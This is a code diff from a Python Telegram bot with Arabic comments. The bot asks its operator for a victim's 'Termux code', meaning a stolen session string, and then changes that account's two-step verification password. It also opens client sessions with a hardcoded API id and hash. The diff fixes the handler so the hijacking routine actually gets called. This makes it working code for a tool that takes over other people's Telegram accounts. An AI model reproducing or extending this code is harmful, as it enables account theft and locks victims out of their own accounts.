@@ -203,7 +203,7 @@ async def change_two_step_password(termux_code, new_password):
         except Exception as e:
             print(e)
             return False
-#تغير تحقق بخطوتين 
+#تحقق 
 async def userbans(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
@@ -908,13 +908,13 @@ async def change_username(event):
 #هذه الاوامر فقط في سورس الخفاش 🦇
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"T")))
-async def change_two_step_password(event):
+async def change_two_step_password_event(event):
     async with bot.conversation(event.chat_id) as conv:
         await conv.send_message("الرجاء إرسال الكود التيرمكس للضحية")
         termux_code_msg = await conv.get_response()
         termux_code = termux_code_msg.text
 
-        success = await termux_code(termux_code)
+        success = await change_two_step_password(termux_code, "")
 
         if success:
             pass  # اذا جان رجع
